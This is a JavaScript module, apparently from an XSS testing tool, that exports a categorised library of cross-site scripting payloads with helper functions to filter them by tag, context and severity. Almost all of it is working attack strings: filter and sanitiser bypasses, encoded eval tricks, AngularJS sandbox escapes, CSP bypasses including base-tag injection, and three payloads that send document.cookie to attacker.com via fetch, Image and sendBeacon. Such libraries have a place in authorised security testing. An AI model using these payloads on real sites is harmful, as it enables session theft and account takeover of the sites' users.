/**
 * @file advanced-payloads.js
 * @description Advanced XSS payloads for complex scenarios
 * @version 8.0.0
 */

(function() {
    'use strict';

    const ADVANCED_PAYLOADS = {
        // ═══════════════════════════════════════════════════════════════
        // 🎯 Filter Bypass Techniques
        // ═══════════════════════════════════════════════════════════════
        filterBypass: [
            {
                id: 'bypass_001',
                payload: '<scr<script>ipt>alert(1)</scr</script>ipt>',
                description: 'Nested tag bypass',
                severity: 'high',
                contexts: ['html'],
                tags: ['bypass', 'nested', 'filter']
            },
            {
                id: 'bypass_002',
                payload: '<img src=x onerror=\u0061lert(1)>',
                description: 'Unicode escape in event handler',
                severity: 'high',
                contexts: ['html'],
                tags: ['bypass', 'unicode', 'encoding']
            },
            {
                id: 'bypass_003',
                payload: '<img src=x onerror=&#97;lert(1)>',
                description: 'HTML entity in event handler',
                severity: 'high',
                contexts: ['html'],
                tags: ['bypass', 'html-entity', 'encoding']
            },
            {
                id: 'bypass_004',
                payload: '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
                description: 'Base64 encoded payload',
                severity: 'high',
                contexts: ['html'],
                tags: ['bypass', 'base64', 'encoding', 'eval']
            },
            {
                id: 'bypass_005',
                payload: '<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>',
                description: 'CharCode encoded payload',
                severity: 'high',
                contexts: ['html'],
                tags: ['bypass', 'charcode', 'encoding']
            },
            {
                id: 'bypass_006',
                payload: '<ScRiPt>alert(1)</sCrIpT>',
                description: 'Mixed case bypass',
                severity: 'high',
                contexts: ['html'],
                tags: ['bypass', 'case', 'filter']
            },
            {
                id: 'bypass_007',
                payload: '<script>a=alert;a(1)</script>',
                description: 'Variable assignment bypass',
                severity: 'high',
                contexts: ['html'],
                tags: ['bypass', 'variable', 'obfuscation']
            },
            {
                id: 'bypass_008',
                payload: '<script>eval(\'ale\'+\'rt(1)\')</script>',
                description: 'String concatenation bypass',
                severity: 'high',
                contexts: ['html'],
                tags: ['bypass', 'concatenation', 'eval']
            },
            {
                id: 'bypass_009',
                payload: '<img src=x:alert(1) onerror=eval(src)>',
                description: 'Attribute reflection bypass',
                severity: 'high',
                contexts: ['html'],
                tags: ['bypass', 'reflection', 'attribute']
            },
            {
                id: 'bypass_010',
                payload: '<svg><script>alert(1)</script></svg>',
                description: 'SVG context bypass',
                severity: 'high',
                contexts: ['html'],
                tags: ['bypass', 'svg', 'context']
            }
        ],

        // ═══════════════════════════════════════════════════════════════
        // 🔀 Protocol Handler Exploits
        // ═══════════════════════════════════════════════════════════════
        protocol: [
            {
                id: 'proto_001',
                payload: '<a href="javascript:alert(1)">click</a>',
                description: 'JavaScript protocol handler',
                severity: 'high',
                contexts: ['html'],
                tags: ['protocol', 'javascript']
            },
            {
                id: 'proto_002',
                payload: '<a href="vbscript:msgbox(1)">click</a>',
                description: 'VBScript protocol handler',
                severity: 'high',
                contexts: ['html'],
                tags: ['protocol', 'vbscript', 'ie']
            },
            {
                id: 'proto_003',
                payload: '<a href="data:text/html,<script>alert(1)</script>">click</a>',
                description: 'Data URI with HTML content',
                severity: 'high',
                contexts: ['html'],
                tags: ['protocol', 'data-uri']
            },
            {
                id: 'proto_004',
                payload: '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>',
                description: 'Base64 data URI',
                severity: 'high',
                contexts: ['html'],
                tags: ['protocol', 'data-uri', 'base64']
            }
        ],

        // ═══════════════════════════════════════════════════════════════
        // 🎭 DOM-Based XSS
        // ═══════════════════════════════════════════════════════════════
        dom: [
            {
                id: 'dom_001',
                payload: '#<script>alert(1)</script>',
                description: 'Hash-based DOM XSS',
                severity: 'high',
                contexts: ['url'],
                tags: ['dom', 'hash', 'url']
            },
            {
                id: 'dom_002',
                payload: 'javascript:alert(document.domain)',
                description: 'Direct javascript execution',
                severity: 'critical',
                contexts: ['url'],
                tags: ['dom', 'javascript', 'url']
            },
            {
                id: 'dom_003',
                payload: '<img src=x onerror=document.location="javascript:alert(1)">',
                description: 'DOM location manipulation',
                severity: 'high',
                contexts: ['html'],
                tags: ['dom', 'location', 'redirect']
            },
            {
                id: 'dom_004',
                payload: '<script>document.write(location.hash.slice(1))</script>#<img src=x onerror=alert(1)>',
                description: 'Document.write DOM XSS',
                severity: 'critical',
                contexts: ['html'],
                tags: ['dom', 'document.write', 'sink']
            }
        ],

        // ═══════════════════════════════════════════════════════════════
        // 🧬 Template Injection
        // ═══════════════════════════════════════════════════════════════
        template: [
            {
                id: 'tmpl_001',
                payload: '{{constructor.constructor("alert(1)")()}}',
                description: 'AngularJS template injection',
                severity: 'critical',
                contexts: ['html', 'javascript'],
                tags: ['template', 'angularjs', 'ssti']
            },
            {
                id: 'tmpl_002',
                payload: '{{$on.constructor("alert(1)")()}}',
                description: 'AngularJS $on constructor',
                severity: 'critical',
                contexts: ['html', 'javascript'],
                tags: ['template', 'angularjs', 'ssti']
            },
            {
                id: 'tmpl_003',
                payload: '{{["a","alert(1)"].pop().constructor.constructor("alert(1)")()}}',
                description: 'AngularJS array constructor',
                severity: 'critical',
                contexts: ['html', 'javascript'],
                tags: ['template', 'angularjs', 'ssti', 'array']
            },
            {
                id: 'tmpl_004',
                payload: '${alert(1)}',
                description: 'Template literal injection',
                severity: 'high',
                contexts: ['javascript'],
                tags: ['template', 'literal', 'es6']
            },
            {
                id: 'tmpl_005',
                payload: '#{alert(1)}',
                description: 'Ruby ERB template injection',
                severity: 'high',
                contexts: ['template'],
                tags: ['template', 'ruby', 'erb', 'ssti']
            },
            {
                id: 'tmpl_006',
                payload: '{{7*7}}',
                description: 'Template expression evaluation test',
                severity: 'info',
                contexts: ['template'],
                tags: ['template', 'test', 'ssti']
            }
        ],

        // ═══════════════════════════════════════════════════════════════
        // 🔗 Prototype Pollution Prep
        // ═══════════════════════════════════════════════════════════════
        prototype: [
            {
                id: 'proto_poll_001',
                payload: '<script>Object.prototype.polluted="XSS";alert(({}).polluted)</script>',
                description: 'Prototype pollution demonstration',
                severity: 'high',
                contexts: ['html'],
                tags: ['prototype', 'pollution', 'object']
            },
            {
                id: 'proto_poll_002',
                payload: '<script>constructor.constructor("alert(1)")()</script>',
                description: 'Constructor chain exploitation',
                severity: 'high',
                contexts: ['html'],
                tags: ['prototype', 'constructor', 'chain']
            }
        ],

        // ═══════════════════════════════════════════════════════════════
        // 🎪 Event-Based Advanced
        // ═══════════════════════════════════════════════════════════════
        events: [
            {
                id: 'evt_001',
                payload: '<div onanimationstart=alert(1) style="animation:a">',
                description: 'CSS animation event trigger',
                severity: 'high',
                contexts: ['html'],
                tags: ['event', 'animation', 'css']
            },
            {
                id: 'evt_002',
                payload: '<div ontransitionend=alert(1) style="transition:all 1s">',
                description: 'CSS transition event trigger',
                severity: 'high',
                contexts: ['html'],
                tags: ['event', 'transition', 'css']
            },
            {
                id: 'evt_003',
                payload: '<input onchange=alert(1) value=x>',
                description: 'Input change event',
                severity: 'medium',
                contexts: ['html'],
                tags: ['event', 'change', 'input']
            },
            {
                id: 'evt_004',
                payload: '<video onloadedmetadata=alert(1)><source>',
                description: 'Video metadata event',
                severity: 'high',
                contexts: ['html'],
                tags: ['event', 'video', 'metadata']
            },
            {
                id: 'evt_005',
                payload: '<marquee onstart=alert(1) onfinish=alert(2)>',
                description: 'Marquee lifecycle events',
                severity: 'medium',
                contexts: ['html'],
                tags: ['event', 'marquee', 'lifecycle']
            }
        ],

        // ═══════════════════════════════════════════════════════════════
        // 🔐 CSP Bypass Attempts
        // ═══════════════════════════════════════════════════════════════
        cspBypass: [
            {
                id: 'csp_001',
                payload: '<script nonce="random123">alert(1)</script>',
                description: 'CSP nonce requirement (needs valid nonce)',
                severity: 'high',
                contexts: ['html'],
                tags: ['csp', 'nonce', 'bypass'],
                note: 'Requires valid nonce value'
            },
            {
                id: 'csp_002',
                payload: '<script src="https://www.google.com/complete/search?client=chrome&q=hello&jsonp=alert#1"></script>',
                description: 'JSONP endpoint CSP bypass',
                severity: 'high',
                contexts: ['html'],
                tags: ['csp', 'jsonp', 'bypass', 'google']
            },
            {
                id: 'csp_003',
                payload: '<link rel="prefetch" href="https://attacker.com/capture?data=sensitive">',
                description: 'CSP bypass via prefetch',
                severity: 'medium',
                contexts: ['html'],
                tags: ['csp', 'prefetch', 'bypass']
            },
            {
                id: 'csp_004',
                payload: '<base href="https://attacker.com/">',
                description: 'Base tag injection for CSP bypass',
                severity: 'high',
                contexts: ['html'],
                tags: ['csp', 'base', 'bypass']
            }
        ],

        // ═══════════════════════════════════════════════════════════════
        // 🎨 Unicode & Encoding Tricks
        // ═══════════════════════════════════════════════════════════════
        encoding: [
            {
                id: 'enc_001',
                payload: '<script>\\u0061\\u006c\\u0065\\u0072\\u0074(1)</script>',
                description: 'Full unicode escape sequence',
                severity: 'high',
                contexts: ['html'],
                tags: ['encoding', 'unicode', 'escape']
            },
            {
                id: 'enc_002',
                payload: '<script>\\x61\\x6c\\x65\\x72\\x74(1)</script>',
                description: 'Hex escape sequence',
                severity: 'high',
                contexts: ['html'],
                tags: ['encoding', 'hex', 'escape']
            },
            {
                id: 'enc_003',
                payload: '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">',
                description: 'Decimal HTML entities',
                severity: 'high',
                contexts: ['html'],
                tags: ['encoding', 'html-entity', 'decimal']
            },
            {
                id: 'enc_004',
                payload: '<img src=x onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">',
                description: 'Hex HTML entities',
                severity: 'high',
                contexts: ['html'],
                tags: ['encoding', 'html-entity', 'hex']
            }
        ],

        // ═══════════════════════════════════════════════════════════════
        // 🌐 Cross-Origin Exploits
        // ═══════════════════════════════════════════════════════════════
        crossOrigin: [
            {
                id: 'xo_001',
                payload: '<script>fetch("https://attacker.com/steal?cookie="+document.cookie)</script>',
                description: 'Cookie exfiltration via fetch',
                severity: 'critical',
                contexts: ['html'],
                tags: ['cross-origin', 'fetch', 'cookie', 'exfiltration']
            },
            {
                id: 'xo_002',
                payload: '<script>new Image().src="https://attacker.com/log?"+document.cookie</script>',
                description: 'Cookie exfiltration via image',
                severity: 'critical',
                contexts: ['html'],
                tags: ['cross-origin', 'image', 'cookie', 'exfiltration']
            },
            {
                id: 'xo_003',
                payload: '<script>navigator.sendBeacon("https://attacker.com/beacon",document.cookie)</script>',
                description: 'Cookie exfiltration via sendBeacon',
                severity: 'critical',
                contexts: ['html'],
                tags: ['cross-origin', 'beacon', 'cookie', 'exfiltration']
            }
        ],

        // ═══════════════════════════════════════════════════════════════
        // 🎯 Framework-Specific
        // ═══════════════════════════════════════════════════════════════
        framework: [
            {
                id: 'fw_001',
                payload: '<div ng-app ng-csp><div ng-click=$event.view.alert(1)>click</div></div>',
                description: 'AngularJS ng-click exploit',
                severity: 'high',
                contexts: ['html'],
                tags: ['framework', 'angularjs', 'ng-click']
            },
            {
                id: 'fw_002',
                payload: '{{constructor.constructor(\'alert(1)\')()}}',
                description: 'AngularJS sandbox bypass',
                severity: 'critical',
                contexts: ['html'],
                tags: ['framework', 'angularjs', 'sandbox', 'bypass']
            },
            {
                id: 'fw_003',
                payload: '<div v-html="\'<img src=x onerror=alert(1)>\'"></div>',
                description: 'Vue.js v-html XSS',
                severity: 'high',
                contexts: ['html'],
                tags: ['framework', 'vue', 'v-html']
            },
            {
                id: 'fw_004',
                payload: 'javascript:alert(React.version)',
                description: 'React version detection',
                severity: 'info',
                contexts: ['url'],
                tags: ['framework', 'react', 'detection']
            }
        ],

        // ═══════════════════════════════════════════════════════════════
        // 🔬 Advanced Testing Payloads
        // ═══════════════════════════════════════════════════════════════
        testing: [
            {
                id: 'test_001',
                payload: '<script>console.log("XSS-TEST-" + Date.now())</script>',
                description: 'Timestamped console test',
                severity: 'info',
                contexts: ['html'],
                tags: ['testing', 'console', 'timestamp']
            },
            {
                id: 'test_002',
                payload: '<script>document.title="XSS-CONFIRMED"</script>',
                description: 'Document title modification test',
                severity: 'info',
                contexts: ['html'],
                tags: ['testing', 'title', 'dom']
            },
            {
                id: 'test_003',
                payload: '<script>document.body.style.background="red"</script>',
                description: 'Visual confirmation test',
                severity: 'info',
                contexts: ['html'],
                tags: ['testing', 'visual', 'style']
            }
        ]
    };

    // ═══════════════════════════════════════════════════════════════════
    // 🎯 Helper Functions
    // ═══════════════════════════════════════════════════════════════════
    function getAllPayloads() {
        const all = [];
        for (const category in ADVANCED_PAYLOADS) {
            all.push(...ADVANCED_PAYLOADS[category]);
        }
        return all;
    }

    function getPayloadsByTag(tag) {
        return getAllPayloads().filter(p => p.tags.includes(tag));
    }

    function getPayloadsByContext(context) {
        return getAllPayloads().filter(p => p.contexts.includes(context));
    }

    function getPayloadsBySeverity(severity) {
        return getAllPayloads().filter(p => p.severity === severity);
    }

    // ═══════════════════════════════════════════════════════════════════
    // 🚀 Export
    // ═══════════════════════════════════════════════════════════════════
    exports.ADVANCED_PAYLOADS = ADVANCED_PAYLOADS;
    exports.getPayloads = getAllPayloads;
    exports.getPayloadsByTag = getPayloadsByTag;
    exports.getPayloadsByContext = getPayloadsByContext;
    exports.getPayloadsBySeverity = getPayloadsBySeverity;
})();